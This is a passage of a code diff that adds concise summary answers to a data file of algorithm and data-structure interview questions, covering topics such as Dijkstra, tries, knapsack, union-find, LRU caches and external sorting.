+        a: `<div class="interview-answer"><p>Sliding window turns a repeated recomputation over every subarray or substring into O(n) by maintaining a running window and updating it incrementally as it moves, instead of recomputing from scratch. Two flavors: fixed-size (max sum of k consecutive elements — slide by adding the new element and dropping the old) and variable-size (longest substring without repeating characters — expand the right edge, shrink the left when a constraint breaks). The tell is a problem about a contiguous subarray or substring plus an optimization or constraint. It usually pairs with a hash map or counter to track window contents. The gotcha is shrinking the window correctly — knowing exactly when and how far to advance the left pointer is where the bugs live.</p></div>
+<p><strong>Sliding Window</strong> = maintain a "window" (subarray/substring) that expands or shrinks as you move through the array. Avoids recomputing from scratch each time.</p>
 <p><strong>Analogy:</strong> A magnifying glass sliding over a book page. You can see a fixed-size chunk of text at a time. As you slide it right, you lose one character from the left and gain one from the right.</p>
 <p><strong>Example 1: Maximum sum of subarray of size K</strong></p>
 <pre>Array: [2, 1, 5, 1, 3, 2], K = 3
@@ -3555,7 +3674,8 @@ int maxSum(int[] arr, int k) {
       {
         q: 'How does a Graph work? Adjacency List vs Adjacency Matrix.',
         difficulty: 'medium',
-        a: `<p>A <strong>Graph</strong> is a collection of nodes (vertices) connected by edges. It models relationships: social networks, roads, web pages, dependencies.</p>
+        a: `<div class="interview-answer"><p>A graph is nodes plus edges, and the first real decision is representation, driven by density. An adjacency list — each vertex holds its neighbors — uses O(V+E) space and is the right default for the sparse graphs you see in practice, with fast neighbor iteration. An adjacency matrix is a V×V grid: O(V²) space regardless of edges but O(1) edge lookup, so it only pays off for dense graphs or when you constantly test "is there an edge between u and v." I also clarify directed vs undirected and weighted vs unweighted early, because those decide which algorithms apply. The gotcha is a matrix blowing up memory on a large sparse graph — a million vertices is a trillion-cell matrix.</p></div>
+<p>A <strong>Graph</strong> is a collection of nodes (vertices) connected by edges. It models relationships: social networks, roads, web pages, dependencies.</p>
 <p><strong>Types:</strong></p>
 <ul>
 <li><strong>Directed</strong>: Edges have direction (Twitter follow: A→B doesn't mean B→A)</li>
@@ -3594,7 +3714,8 @@ graph.put(1, Arrays.asList(0, 2));
       {
         q: "What is Dijkstra's Algorithm?",
         difficulty: 'hard',
-        a: `<p><strong>Dijkstra's Algorithm</strong> finds the <strong>shortest path</strong> from a source node to all other nodes in a <strong>weighted graph</strong> (non-negative weights).</p>
+        a: `<div class="interview-answer"><p>Dijkstra finds single-source shortest paths in a graph with non-negative weights by greedily expanding the closest unvisited node, using a min-heap to always pull the current nearest — that gives O((V+E) log V). The greedy choice is only valid because weights are non-negative; the single most important thing to say is that Dijkstra breaks on negative edges, where you switch to Bellman-Ford (O(VE), and it detects negative cycles). If you have a heuristic toward a specific target, A* is Dijkstra plus that heuristic and is faster in practice. For unweighted graphs, plain BFS is the right tool. The classic implementation gotcha is using a lazy-deletion heap — push duplicates, skip stale entries — rather than a decrease-key operation.</p></div>
+<p><strong>Dijkstra's Algorithm</strong> finds the <strong>shortest path</strong> from a source node to all other nodes in a <strong>weighted graph</strong> (non-negative weights).</p>
 <p><strong>Analogy:</strong> You're at a city (node A) and want the shortest route to every other city. You start by visiting the nearest city first, then update distances to its neighbors. Always visit the unvisited city with the smallest known distance.</p>
 <pre>Graph:
   A --1-- B --3-- D
@@ -3641,7 +3762,8 @@ void dijkstra(int[][] graph, int src) {
       {
         q: 'What is the Greedy Algorithm approach?',
         difficulty: 'medium',
-        a: `<p>A <strong>Greedy Algorithm</strong> makes the <strong>locally optimal choice</strong> at each step, hoping it leads to the globally optimal solution.</p>
+        a: `<div class="interview-answer"><p>Greedy makes the locally optimal choice at each step and never reconsiders, which is fast and simple — but the whole game is proving it actually yields the global optimum, because for most problems it doesn't. It only works when the problem has the greedy-choice property and optimal substructure; the canonical wins are interval scheduling, Huffman coding, Dijkstra, and minimum spanning trees. The classic trap is coin change: greedy works for standard denominations but fails for arbitrary ones, where you need DP. So in an interview my instinct is to try greedy, then immediately look for a counterexample — if I can't prove it or break it, I fall back to DP. Greedy is a hypothesis, not a default.</p></div>
+<p>A <strong>Greedy Algorithm</strong> makes the <strong>locally optimal choice</strong> at each step, hoping it leads to the globally optimal solution.</p>
 <p><strong>Analogy:</strong> Climbing a mountain in fog. You can only see a few meters ahead. At each step, you walk in the direction that goes UP the most. This doesn't always get you to the highest peak, but for many problems, it works perfectly.</p>
 <p><strong>Example 1: Coin Change (Greedy works here)</strong></p>
 <pre>Make change for 36 cents using fewest coins [25, 10, 5, 1]:
@@ -3671,7 +3793,8 @@ void dijkstra(int[][] graph, int src) {
       {
         q: 'What is Backtracking?',
         difficulty: 'hard',
-        a: `<p><strong>Backtracking</strong> = try all possible options, and when you hit a dead end, undo the last choice and try a different path. It's like solving a maze — if you hit a wall, go back and try another turn.</p>
+        a: `<div class="interview-answer"><p>Backtracking is systematic brute force over a decision tree: you build a candidate incrementally, and the moment a partial solution can't possibly work you prune that whole branch and undo the last choice — that pruning is what separates it from naive exhaustive search. It's the tool for constraint-satisfaction and combinatorial problems: permutations, combinations, subsets, N-Queens, Sudoku, word search. The template is choose, explore, un-choose — recurse, then undo state. It's still exponential in the worst case, so the art is strong pruning and good constraint checks to cut the search space early. The gotcha is forgetting to undo the choice on the way back up, which corrupts state for sibling branches.</p></div>
+<p><strong>Backtracking</strong> = try all possible options, and when you hit a dead end, undo the last choice and try a different path. It's like solving a maze — if you hit a wall, go back and try another turn.</p>
 <p><strong>Analogy:</strong> Trying combinations on a lock. Try 000, 001, 002... If you know the first digit is 3 (constraint), you skip 000-299 entirely. That's the power of backtracking — <strong>pruning</strong> bad choices early.</p>
 <p><strong>Example: Generate all permutations of [1, 2, 3]</strong></p>
 <pre>                 []
@@ -3708,7 +3831,8 @@ void permute(int[] nums, List&lt;Integer&gt; current, boolean[] used, List&lt;Li
       {
         q: 'What is the difference between Stable and Unstable sorting?',
         difficulty: 'easy',
-        a: `<p>A <strong>stable</strong> sort preserves the relative order of equal elements. An <strong>unstable</strong> sort doesn't guarantee it.</p>
+        a: `<div class="interview-answer"><p>A stable sort keeps equal elements in their original relative order; an unstable one may reorder them. It sounds academic until you do multi-key sorting: sort by name, then by department, and stability is what preserves the name order within each department — that's the practical reason it matters, and why databases and spreadsheets need stable sorts. Merge sort and insertion sort are stable; quicksort and heapsort are not in their standard forms. That's exactly why Java uses Timsort (stable, merge-based) for objects but a dual-pivot quicksort for primitives, where stability is meaningless since equal ints are indistinguishable. You can always make an unstable sort stable by adding the original index as a tiebreaker, at some cost.</p></div>
+<p>A <strong>stable</strong> sort preserves the relative order of equal elements. An <strong>unstable</strong> sort doesn't guarantee it.</p>
 <p><strong>Analogy:</strong> You have a list of students sorted by name. Now sort by grade. With a <strong>stable</strong> sort, students with the same grade remain alphabetically ordered. With an unstable sort, their name order might get shuffled.</p>
 <pre>Original (sorted by name):
   Alice: B
@@ -3737,7 +3861,8 @@ Unstable sort by grade:
       {
         q: 'How do you detect a cycle in a Linked List?',
         difficulty: 'medium',
-        a: `<p>Use <strong>Floyd's Tortoise and Hare</strong> algorithm: two pointers, one moves 1 step (slow), the other moves 2 steps (fast). If there's a cycle, they'll eventually meet.</p>
+        a: `<div class="interview-answer"><p>Floyd's tortoise-and-hare is the elegant answer: two pointers, slow moving one step and fast moving two; if there's a cycle they must eventually meet inside it, and if fast hits null there's no cycle. The beauty is O(n) time and O(1) space — no hash set of visited nodes, which is the naive alternative. The follow-up that trips people up is finding the cycle's start: after they meet, reset one pointer to the head and advance both one step at a time, and they meet at the entry — a neat number-theory result about the distances. I'd mention the hash-set approach too, since it's simpler to reason about and generalizes, but Floyd's wins on space and is what they're fishing for.</p></div>
+<p>Use <strong>Floyd's Tortoise and Hare</strong> algorithm: two pointers, one moves 1 step (slow), the other moves 2 steps (fast). If there's a cycle, they'll eventually meet.</p>
 <p><strong>Analogy:</strong> Two runners on a circular track. The fast runner laps the slow runner — they MUST meet. On a straight track (no cycle), the fast runner just reaches the end.</p>
 <pre>Linked List with cycle:
   1 → 2 → 3 → 4 → 5
@@ -3784,7 +3909,8 @@ ListNode findCycleStart(ListNode head) {
       {
         q: 'What is a Trie (Prefix Tree) and when is it used?',
         difficulty: 'hard',
-        a: `<p>A <strong>Trie</strong> is a tree-like data structure for storing strings where each node represents a character. It's extremely fast for prefix-based lookups.</p>
+        a: `<div class="interview-answer"><p>A trie stores strings by sharing prefixes — each node is a character and a root-to-node path spells a string — so lookup and insert are O(L) in the key length, independent of how many words you've stored, which beats a hash map for prefix work. Its killer feature is prefix queries: autocomplete, spell-check, and "all words starting with..." are trivial, which a hash map simply can't do. The tradeoff is memory — a naive trie with 26 (or 256) child pointers per node is wasteful — so in practice you use a map per node, or compress to a radix/Patricia trie. It powers autocomplete and IP routing tables. The gotcha is that for pure exact-match lookups a hash map is usually simpler and lighter.</p></div>
+<p>A <strong>Trie</strong> is a tree-like data structure for storing strings where each node represents a character. It's extremely fast for prefix-based lookups.</p>
 <p><strong>Analogy:</strong> A dictionary organized letter by letter. To find "cat", go to 'c', then 'a', then 't'. To find all words starting with "ca", follow 'c' → 'a' and you immediately see all options.</p>
 <pre>Trie storing ["cat", "car", "card", "dog"]:
 
@@ -3842,7 +3968,8 @@ class Trie {
       {
         q: 'What is the Knapsack Problem?',
         difficulty: 'hard',
-        a: `<p>The <strong>Knapsack Problem</strong>: Given items with weights and values, select items to maximize total value without exceeding a weight limit.</p>
+        a: `<div class="interview-answer"><p>Knapsack is the archetypal DP: maximize value under a weight budget. The key distinction is 0/1 (each item taken once) versus unbounded (unlimited copies), because it changes the recurrence and the loop direction. For 0/1 the state is dp[i][w] = best value using the first i items within capacity w, and the space-optimized trick is a 1D array iterated backwards so you don't reuse an item. The crucial gotcha to name is that it's only "polynomial" in the pseudo sense — O(n·W), where W is a numeric value, not the input size, so it's actually exponential in the bit-length of W, which is why knapsack is NP-hard. Greedy by value/weight ratio solves fractional knapsack but not 0/1.</p></div>
+<p>The <strong>Knapsack Problem</strong>: Given items with weights and values, select items to maximize total value without exceeding a weight limit.</p>
 <p><strong>Analogy:</strong> You're packing for a hike with a backpack that holds 10kg. You have a tent (3kg, value 5), sleeping bag (4kg, value 7), food (5kg, value 8), camera (2kg, value 4). What do you take to maximize usefulness?</p>
 <p><strong>0/1 Knapsack (can't split items):</strong></p>
 <pre>Items: [{weight:3, value:5}, {weight:4, value:7}, 
@@ -3881,7 +4008,8 @@ int knapsack(int[] weights, int[] values, int capacity) {
       {
         q: 'What is Topological Sort?',
         difficulty: 'hard',
-        a: `<p><strong>Topological Sort</strong> orders nodes in a <strong>directed acyclic graph (DAG)</strong> such that for every edge A→B, A comes before B.</p>
+        a: `<div class="interview-answer"><p>Topological sort linearizes a DAG so every edge points forward — it's the answer to any "ordering with dependencies" problem: build systems, task scheduling, course prerequisites, package resolution. Two standard implementations: Kahn's algorithm (BFS on in-degrees, repeatedly removing zero-incoming nodes) and DFS with a finish-time stack, both O(V+E). The most important property to state is that it only exists if the graph is acyclic, so topological sort doubles as cycle detection — if you can't produce a full ordering (Kahn's leaves nodes with nonzero in-degree), there's a cycle, which is exactly how build tools catch circular dependencies. The order isn't unique unless the DAG is a single chain.</p></div>
+<p><strong>Topological Sort</strong> orders nodes in a <strong>directed acyclic graph (DAG)</strong> such that for every edge A→B, A comes before B.</p>
 <p><strong>Analogy:</strong> Getting dressed. You must put on underwear before pants, socks before shoes. There's a dependency order. Topological sort gives you a valid order to get dressed.</p>
 <pre>Dependencies:
   underwear → pants → belt
@@ -3928,7 +4056,8 @@ List&lt;Integer&gt; topologicalSort(int n, List&lt;List&lt;Integer&gt;&gt; adj) 
       {
         q: 'What is the Union-Find (Disjoint Set) data structure?',
         difficulty: 'hard',
-        a: `<p><strong>Union-Find</strong> tracks a collection of elements partitioned into disjoint (non-overlapping) sets. It supports two operations efficiently: <strong>Find</strong> (which set does this element belong to?) and <strong>Union</strong> (merge two sets).</p>
+        a: `<div class="interview-answer"><p>Union-Find (disjoint set) tracks a partition into groups and answers "are these two in the same set?" and "merge these two sets" in nearly O(1). The magic is the two optimizations together: path compression (flatten the tree on find) and union by rank or size (attach the smaller tree under the larger), which give an amortized inverse-Ackermann cost — effectively constant. It's the natural fit for dynamic connectivity: Kruskal's MST, detecting cycles in an undirected graph, counting connected components, and equivalence grouping. The tell in an interview is "group these" or "are these connected" with incremental unions. The gotcha is that it handles unions well but not splits — it's not designed for disconnecting.</p></div>
+<p><strong>Union-Find</strong> tracks a collection of elements partitioned into disjoint (non-overlapping) sets. It supports two operations efficiently: <strong>Find</strong> (which set does this element belong to?) and <strong>Union</strong> (merge two sets).</p>
 <p><strong>Analogy:</strong> Social groups at a party. Each group has a leader. When two groups decide to merge, one leader becomes the new leader. To check if two people are in the same group, check if they have the same leader.</p>
 <pre>Initially: Each person is their own group
   {A} {B} {C} {D} {E}
@@ -3978,7 +4107,8 @@ class UnionFind {
       {
         q: "How do you solve the 'Two Sum' problem?",
         difficulty: 'easy',
-        a: `<p><strong>Problem:</strong> Given an array and a target, find two numbers that add up to the target. Return their indices.</p>
+        a: `<div class="interview-answer"><p>Two Sum is the canonical "hash map beats brute force" problem. The naive nested loop is O(n²); the trick is a single pass with a hash map of value to index, and for each element you check whether target minus it is already in the map — O(n) time, O(n) space. The insight I'd articulate is trading space for time by remembering what you've seen. If the array were sorted, the alternative is two pointers converging from both ends, O(n) time and O(1) space but O(n log n) to sort first, so which is "better" depends on whether it's pre-sorted. The gotchas the interviewer is probing are handling duplicates, not using the same element twice, and returning indices versus values.</p></div>
+<p><strong>Problem:</strong> Given an array and a target, find two numbers that add up to the target. Return their indices.</p>
 <p><strong>Analogy:</strong> You have a jar of numbered balls. You pick one ball and ask: "Is there another ball that, together, adds up to the target?" Instead of checking every pair (slow), you remember what you've already seen.</p>
 <pre>Array: [2, 7, 11, 15], Target: 9
 
@@ -4017,7 +4147,8 @@ while (left < right) {
       {
         q: 'What is Bit Manipulation and common bitwise tricks?',
         difficulty: 'medium',
-        a: `<p><strong>Bit Manipulation</strong> = working directly with binary representations of numbers. Extremely fast and memory-efficient.</p>
+        a: `<div class="interview-answer"><p>Bit manipulation works directly on the binary representation, and it's worth knowing a handful of idioms cold: <code>x &amp; 1</code> for odd/even, <code>x &amp; (x-1)</code> clears the lowest set bit (so it counts set bits and tests power-of-two), XOR for toggling and finding the single unpaired element since <code>a ^ a = 0</code>, and shifts for fast multiply or divide by powers of two. Bitmasks are the practical payoff: representing a set of up to about 64 elements in one integer, the backbone of bitmask DP for subset problems. The gotchas I'd flag are signedness and arithmetic vs logical right shift, operator precedence (bitwise ops bind loosely, so parenthesize), and undefined behavior shifting by the full width. Great for micro-optimization, but don't trade away readability without cause.</p></div>
+<p><strong>Bit Manipulation</strong> = working directly with binary representations of numbers. Extremely fast and memory-efficient.</p>
 <p><strong>Analogy:</strong> Normal math uses decimal (base 10). Computers think in binary (base 10 → base 2). Bit manipulation is "speaking the computer's native language".</p>
 <pre>Basic operators:
   AND (&):  1010 & 1100 = 1000  (both bits must be 1)
@@ -4059,7 +4190,8 @@ int hammingWeight(int n) {
       {
         q: 'What is Memoization vs Tabulation in Dynamic Programming?',
         difficulty: 'medium',
-        a: `<p>Both are strategies for DP. They store computed results to avoid redundant work.</p>
+        a: `<div class="interview-answer"><p>They're the two ways to implement DP and they compute the same thing. Memoization is top-down: write the natural recursion and cache results, so it only ever computes the states you actually reach — great when the state space is sparse, and easier to write since you don't work out a fill order. Tabulation is bottom-up: fill a table iteratively in dependency order, which avoids recursion overhead and stack-overflow risk and usually makes space optimization obvious (keep only the last row). My rule: prototype with memoization because it maps straight to the recurrence, then convert to tabulation if I need the performance, the space trick, or recursion depth is a risk. The gotcha with memoization is a correct cache key covering the full state.</p></div>
+<p>Both are strategies for DP. They store computed results to avoid redundant work.</p>
 <p><strong>Memoization (Top-Down):</strong> Start from the big problem, recursively break it down, and <strong>cache</strong> results as you go.</p>
 <p><strong>Tabulation (Bottom-Up):</strong> Start from the smallest sub-problems, iteratively build up to the answer using a <strong>table</strong>.</p>
 <p><strong>Analogy — Building a staircase to floor 10:</strong></p>
@@ -4097,7 +4229,8 @@ int climb(int n) {
       {
         q: 'How does Counting Sort / Radix Sort work? When are they faster than O(n log n)?',
         difficulty: 'hard',
-        a: `<p><strong>Counting Sort</strong> and <strong>Radix Sort</strong> are non-comparison sorts that can beat the O(n log n) barrier by using the structure of the data itself.</p>
+        a: `<div class="interview-answer"><p>These beat the O(n log n) comparison lower bound by not comparing elements — they exploit the structure of the keys instead. Counting sort tallies occurrences of each key and rebuilds the output in O(n + k), where k is the value range, so it's linear only when k is comparable to n; a huge range makes it useless and memory-hungry. Radix sort applies a stable counting sort digit by digit, giving O(d·(n + b)) for d digits in base b — good for fixed-width integers or strings. The catch to state clearly is that the O(n log n) bound only applies to comparison sorts; these trade generality and memory for speed and only work on integer-like keys with a bounded range. Counting sort's stability is what makes radix sort correct.</p></div>
+<p><strong>Counting Sort</strong> and <strong>Radix Sort</strong> are non-comparison sorts that can beat the O(n log n) barrier by using the structure of the data itself.</p>
 <p><strong>Counting Sort — O(n + k)</strong> where k is the range of values:</p>
 <p><strong>Analogy:</strong> You have 100 exam scores from 0-100. Instead of comparing scores, just count how many students got each score and rebuild the sorted list.</p>
 <pre>Input: [4, 2, 2, 8, 3, 3, 1]
@@ -4126,7 +4259,8 @@ Sort by 100s digit:[2, 24, 45, 66, 75, 90, 170, 802] ✅</pre>
       {
         q: 'What is a Monotonic Stack and when do you use it?',
         difficulty: 'hard',
-        a: `<p>A <strong>Monotonic Stack</strong> is a stack that maintains elements in a strictly increasing or decreasing order. Elements are popped when the ordering would be violated.</p>
+        a: `<div class="interview-answer"><p>A monotonic stack keeps its elements in sorted order by popping anything that would violate the order as you push — and that popping is where the work happens. It's the specialized tool for "next/previous greater or smaller element" problems: the moment you pop an element you've found its next greater element, which turns an O(n²) scan into O(n) because each element is pushed and popped at most once. The classic applications are next-greater-element, daily temperatures, largest rectangle in a histogram, and stock span. The tell in an interview is "for each element, find the nearest bigger or smaller one." The gotcha is deciding whether to store values or indices — usually indices, so you can compute distances — and getting the increasing-vs-decreasing direction right for the question.</p></div>
+<p>A <strong>Monotonic Stack</strong> is a stack that maintains elements in a strictly increasing or decreasing order. Elements are popped when the ordering would be violated.</p>
 <p><strong>Analogy:</strong> A line of people sorted by height. When a tall person arrives, everyone shorter in front of them steps out of line. The line stays in order.</p>
 <p><strong>Classic problem: Next Greater Element</strong></p>
 <pre>Input: [2, 1, 2, 4, 3]
@@ -4166,7 +4300,8 @@ int[] nextGreater(int[] nums) {
       {
         q: 'What is Binary Search on Answer?',
         difficulty: 'medium',
-        a: `<p><strong>Binary Search on Answer</strong> = instead of searching for an element in an array, you binary search over the <strong>range of possible answers</strong> to find the optimal one.</p>
+        a: `<div class="interview-answer"><p>This is the technique that unlocks a whole class of "minimize the maximum" or "maximize the minimum" problems that don't look like search at all. Instead of searching an array, you binary-search over the range of possible answers, and for each candidate you run a feasibility check — "can we do it with this value?" The precondition is monotonicity: if a candidate works, everything above (or below) it works too, which is what lets you discard half the range each step. Classic examples are splitting an array into k parts to minimize the largest sum, Koko eating bananas, and resource allocation. Complexity is O(log(range) × cost-of-check). The two things to nail are proving monotonicity and writing a correct predicate — the check is usually a simple greedy pass.</p></div>
+<p><strong>Binary Search on Answer</strong> = instead of searching for an element in an array, you binary search over the <strong>range of possible answers</strong> to find the optimal one.</p>
 <p><strong>Analogy:</strong> "What's the minimum speed to deliver all packages within 8 hours?" Speed could be 1-1000. Instead of trying each, binary search: "Is speed 500 enough? Yes → try 250. No → try 750."</p>
 <p><strong>Example: Koko Eating Bananas</strong></p>
 <pre>Problem: Koko has piles of bananas [3, 6, 7, 11]. 
@@ -4202,7 +4337,8 @@ boolean canFinish(int[] piles, int h, int speed) {
       {
         q: 'What is the difference between a Set, Map, and List?',
         difficulty: 'easy',
-        a: `<p>Three fundamental collection types in programming:</p>
+        a: `<div class="interview-answer"><p>These are the three workhorses and the choice is about what you need. A List is an ordered sequence allowing duplicates, indexed by position — use it when order matters or you need duplicates. A Set is an unordered collection of unique elements optimized for membership testing — use it for dedup and "have I seen this?" A Map is key-value associations with unique keys — use it for lookups by key. The nuance a senior adds is the implementation behind each interface: hash-based (HashSet, HashMap) for O(1) average but no order, tree-based (TreeSet, TreeMap) for O(log n) with sorted order, and linked variants for insertion-order iteration. So the real question is interface first — what operations — then implementation, meaning ordering and complexity tradeoffs.</p></div>
+<p>Three fundamental collection types in programming:</p>
 <p><strong>Analogy:</strong></p>
 <ul>
 <li><strong>List</strong> = Shopping list: ordered, can have duplicates ("buy milk, eggs, milk").</li>
@@ -4231,7 +4367,8 @@ map.put("apple", 5); map.get("apple"); // 5</pre>
       {
         q: 'Design an LRU Cache with O(1) get and put.',
         difficulty: 'tricky',
-        a: `<p>THE classic senior coding question. An LRU (Least Recently Used) cache evicts the item that hasn't been touched for the longest time. The trick: <strong>no single structure gives O(1) for everything</strong>, so you combine two:</p>
+        a: `<div class="interview-answer"><p>The whole challenge is getting O(1) for both get and put, and the insight is that no single structure does it — so you combine two: a hash map for O(1) key lookup and a doubly-linked list to track recency order. The map points to nodes in the list; on access you move the node to the front, and on eviction you drop the tail — all O(1) pointer surgery because you hold direct node references. The doubly-linked part is essential: you need O(1) removal from the middle, which a singly-linked list can't do. The gotchas are keeping both structures in sync and the edge cases — updating an existing key, capacity of one. In real life I'd just use a <code>LinkedHashMap</code> in access-order, or Caffeine/Guava, which do exactly this.</p></div>
+<p>THE classic senior coding question. An LRU (Least Recently Used) cache evicts the item that hasn't been touched for the longest time. The trick: <strong>no single structure gives O(1) for everything</strong>, so you combine two:</p>
 <ul>
 <li><strong>HashMap</strong>: key → node. O(1) lookup — but no notion of "order of use".</li>
 <li><strong>Doubly-linked list</strong>: nodes ordered by recency (head = most recent, tail = LRU victim). O(1) move-to-front and remove — but O(n) lookup.</li>
@@ -4283,7 +4420,8 @@ get(2)   → -1         // gone</pre>
       {
         q: 'How do you find the Top-K elements from a huge stream of data?',
         difficulty: 'hard',
-        a: `<p>The naive answer — sort everything, take the first K — is O(n log n) and requires holding all n items. The senior answer: keep a <strong>min-heap of size K</strong>.</p>
+        a: `<div class="interview-answer"><p>The naive "sort and take K" is O(n log n) and needs all n in memory, which fails on a stream. The standard answer is a min-heap of size K: iterate once, push each element, and pop the smallest whenever the heap exceeds K, so the heap always holds the K largest seen. That's O(n log K) time and O(K) space, which is the win — it never holds the whole stream. The direction trips people up: for top-K largest you keep a min-heap so the weakest survivor is cheap to evict. For a one-shot in-memory array, Quickselect gives O(n) average by partitioning around the K-th element. And at true scale it's a distributed problem — partial top-K per shard then merge — which is Count-Min sketch territory for approximate heavy hitters.</p></div>
+<p>The naive answer — sort everything, take the first K — is O(n log n) and requires holding all n items. The senior answer: keep a <strong>min-heap of size K</strong>.</p>
 <pre>// Top-K largest with a MIN-heap (yes, MIN — the counterintuitive part):
 // The heap root is the SMALLEST of the current top K —
 // i.e. the "weakest member of the club" = the cheapest to test against.
@@ -4314,7 +4452,8 @@ function topK(stream, k) {
       {
         q: 'How do you sort a 100 GB file with only 1 GB of RAM?',
         difficulty: 'tricky',
-        a: `<p>The systems-flavored sorting question — it checks whether you know that sorting doesn't stop working when data exceeds RAM. The answer is <strong>external merge sort</strong>, the same algorithm inside databases (ORDER BY spills), MapReduce shuffles, and Unix <code>sort</code>.</p>
+        a: `<div class="interview-answer"><p>The point is that sorting doesn't stop working when data exceeds RAM — the answer is external merge sort. Phase one: read the file in chunks that fit in memory, sort each chunk in RAM, and write it back as a sorted "run" on disk. Phase two: k-way merge those runs using a min-heap holding one element from each run, streaming the merged output to disk — you only ever hold one buffer per run in memory. It's the same algorithm a database uses when an ORDER BY spills to disk, and what MapReduce shuffles and Unix <code>sort</code> do. The tuning knobs are chunk size versus available RAM and the merge fan-in — too many runs forces a multi-pass merge. The dominant cost is disk I/O, so you optimize for sequential reads and large buffers.</p></div>
+<p>The systems-flavored sorting question — it checks whether you know that sorting doesn't stop working when data exceeds RAM. The answer is <strong>external merge sort</strong>, the same algorithm inside databases (ORDER BY spills), MapReduce shuffles, and Unix <code>sort</code>.</p>
 <pre>// Phase 1: CHUNK → SORT → SPILL
 // Read ~1 GB at a time, sort in memory, write sorted "run" to disk.
 100 GB input
@@ -4346,7 +4485,8 @@ while heap not empty:
       {
         q: 'Find the missing or duplicate number in an array of 1..n — compare the three classic solutions.',
         difficulty: 'tricky',
-        a: `<p>Deceptively simple, but interviewers use it to see how many tools you have — and whether you know each one's failure mode. Setup: array of numbers from 1..n with one missing (or one duplicated).</p>
+        a: `<div class="interview-answer"><p>It's deceptively simple, and the interviewer wants to see how many approaches you have and their tradeoffs. The three classics: a hash set or boolean array — O(n) time, O(n) space, trivial and general; the sum formula — expected n(n+1)/2 minus the actual sum gives the missing number — O(n) time, O(1) space, elegant but risks integer overflow on large n; and XOR — XOR all values with 1..n so the pairs cancel and the answer remains — O(n) time, O(1) space, and no overflow, which makes it the cleanest. There's also cyclic sort or index-marking (negate the value at each seen index) if you may mutate the array. I'd lead with XOR or the sum trick and then name the overflow caveat, because naming the failure mode is the signal.</p></div>
+<p>Deceptively simple, but interviewers use it to see how many tools you have — and whether you know each one's failure mode. Setup: array of numbers from 1..n with one missing (or one duplicated).</p>
 <pre>// Solution 1: Sum formula — O(n) time, O(1) space
 // Expected sum of 1..n = n(n+1)/2
 function findMissing(nums, n) {
@@ -4398,7 +4538,8 @@ function findDuplicate(nums) {
       {
         q: 'What is Reservoir Sampling? How do you pick a random item from a stream of unknown length?',
         difficulty: 'tricky',
-        a: `<p>Problem: items arrive one at a time; you don't know how many will come and can't store them all. When the stream ends, you must hold ONE item chosen <strong>uniformly at random</strong> — every item with probability exactly 1/n — using O(1) space.</p>
+        a: `<div class="interview-answer"><p>Reservoir sampling picks a uniformly random item from a stream of unknown length in O(1) space — you can't count first, so the trick is probabilistic. For a single item: keep the current pick, and when the i-th item arrives replace your held item with probability 1/i. A quick induction shows every item ends up with probability exactly 1/n. For a sample of size k you keep a reservoir of k and replace with probability k/i. The beauty is one pass, O(1) or O(k) memory, and no knowledge of n — which is exactly why it's used for sampling logs, big-data streams, and picking a random line from a huge file. The gotcha is getting the replacement probability right; an off-by-one there silently biases toward early or late elements.</p></div>
+<p>Problem: items arrive one at a time; you don't know how many will come and can't store them all. When the stream ends, you must hold ONE item chosen <strong>uniformly at random</strong> — every item with probability exactly 1/n — using O(1) space.</p>
 <pre>// Reservoir sampling (k = 1):
 function sample(stream) {
   let chosen = null, i = 0;
